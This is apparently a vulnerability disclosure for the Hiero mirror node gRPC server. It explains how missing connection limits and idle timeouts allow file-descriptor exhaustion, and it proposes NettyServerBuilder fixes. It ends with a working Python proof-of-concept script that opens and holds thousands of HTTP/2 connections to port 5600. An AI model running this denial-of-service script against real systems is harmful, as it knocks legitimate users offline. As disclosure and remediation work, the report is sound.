### Title
Unbounded TCP Connection Exhaustion via Missing Global Connection Cap on NettyServerBuilder (Port 5600)

### Summary
The `grpcServerConfigurer()` bean in `GrpcConfiguration.java` configures the `NettyServerBuilder` with only a per-connection RPC call limit (`maxConcurrentCallsPerConnection`), but sets no global TCP connection count ceiling, no idle-connection timeout (`maxConnectionIdle`), and no maximum connection age (`maxConnectionAge`). An unauthenticated attacker can open an unbounded number of TCP connections to port 5600, hold them open with zero active streams, and exhaust the JVM process's file descriptor quota, causing the gRPC server to refuse all new connections.

### Finding Description
**Exact code path:**

`grpc/src/main/java/org/hiero/mirror/grpc/config/GrpcConfiguration.java`, `grpcServerConfigurer()`, lines 28–35:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
};
```

`grpc/src/main/java/org/hiero/mirror/grpc/config/NettyProperties.java`, line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```

**Root cause:** `maxConcurrentCallsPerConnection(5)` limits the number of concurrent gRPC *calls* per individual connection. It does **not** limit the number of TCP connections that can be established. The `NettyServerBuilder` API provides `maxConnectionIdle(long, TimeUnit)` to close idle connections and `maxConnectionAge(long, TimeUnit)` to force connection recycling — neither is called anywhere in the codebase (confirmed by grep across all `.java` files). There is also no `permitKeepAliveTime`, no `maxConnections`, and no external network-layer connection count cap.

**Exploit flow:**
1. Attacker opens a raw TCP connection to port 5600 and completes the HTTP/2 client preface (24-byte magic + SETTINGS frame) — this is all that is needed to hold a valid gRPC transport connection open.
2. Attacker sends no RPC calls (or sends one long-lived `subscribeTopic` call per connection to keep it alive at the application layer).
3. Each connection consumes one file descriptor in the JVM process.
4. With no idle timeout and no connection count limit, the server never closes these connections.
5. Attacker repeats until the OS file descriptor limit (typically 65535 for a container) is reached.
6. Netty's `NioServerSocketChannel` `accept()` call fails with `Too many open files`; all subsequent legitimate connection attempts are rejected.

**Why existing checks fail:**
- `maxConcurrentCallsPerConnection(5)`: per-connection call cap, irrelevant to connection count.
- GCP `maxRatePerEndpoint: 250` (`charts/hedera-mirror-grpc/values.yaml` line 69): a *request rate* limit, not a *connection count* limit; idle connections generate zero requests.
- `timeoutSec: 20` (line 72): a backend *request* timeout, not an idle *connection* timeout.
- Traefik circuit breaker/retry middleware (lines 157–161): triggers on error ratios, not connection counts.
- `GrpcHighFileDescriptors` Prometheus alert (lines 221–231): fires *after* 80% FD exhaustion — a detection control, not a prevention control.

### Impact Explanation
When file descriptors are exhausted, the gRPC server cannot accept any new TCP connections. All clients — including legitimate subscribers to HCS topic messages and address book consumers — are denied service. Because the mirror node's gRPC API is the sole interface for clients to receive streamed transaction confirmations and network state, this constitutes a complete denial of service of the gRPC tier. Recovery requires either restarting the pod (dropping all existing connections) or waiting for the attacker to release connections.

### Likelihood Explanation
The attack requires no authentication, no special privileges, and no knowledge of the application beyond the publicly documented port (5600). Opening thousands of TCP connections and sending an HTTP/2 client preface is trivially scriptable with standard tools (`hpack`, `h2load`, or a raw Python socket loop). A single attacker machine with a typical ephemeral port range (~28,000 ports) can exhaust a default container FD limit in one burst. The attack is repeatable immediately after a pod restart. The existence of the `GrpcHighFileDescriptors` alert rule confirms the operators already consider FD exhaustion a realistic operational risk.

### Recommendation
In `grpcServerConfigurer()`, add the following calls to the `NettyServerBuilder`:

```java
return serverBuilder -> {
    serverBuilder.executor(applicationTaskExecutor);
    serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
    // Add these:
    serverBuilder.maxConnectionIdle(nettyProperties.getMaxConnectionIdle(), TimeUnit.MILLISECONDS);
    serverBuilder.maxConnectionAge(nettyProperties.getMaxConnectionAge(), TimeUnit.MILLISECONDS);
    serverBuilder.maxConnectionAgeGrace(nettyProperties.getMaxConnectionAgeGrace(), TimeUnit.MILLISECONDS);
};
```

Add the corresponding fields to `NettyProperties.java` with safe defaults (e.g., `maxConnectionIdle = 300_000` ms / 5 min, `maxConnectionAge = 3_600_000` ms / 1 hr). Additionally, consider adding a `keepAliveTimeout` and enforcing `permitKeepAliveTime` to reject clients that send keepalives too aggressively. At the infrastructure layer, add a per-source-IP connection count limit at the load balancer or via a Kubernetes `NetworkPolicy` with connection tracking.

### Proof of Concept
```python
import socket, time, threading

TARGET_HOST = "<grpc-server-ip>"
TARGET_PORT = 5600
# HTTP/2 client preface: magic + SETTINGS frame
H2_PREFACE = (
    b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"  # 24-byte client magic
    b"\x00\x00\x00\x04\x00\x00\x00\x00\x00"  # empty SETTINGS frame
)

sockets = []

def hold_connection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    s.sendall(H2_PREFACE)
    sockets.append(s)

threads = []
for i in range(10000):  # adjust to OS ephemeral port range
    t = threading.Thread(target=hold_connection)
    t.start()
    threads.append(t)

for t in threads:
    t.join()

print(f"Holding {len(sockets)} connections open. Server should now reject new connections.")
time.sleep(300)  # hold for 5 minutes
```

After running this script, any new legitimate gRPC client attempting to connect to port 5600 will receive a connection-refused or timeout error. The `GrpcHighFileDescriptors` alert will fire within 5 minutes of the FD ratio exceeding 80%.
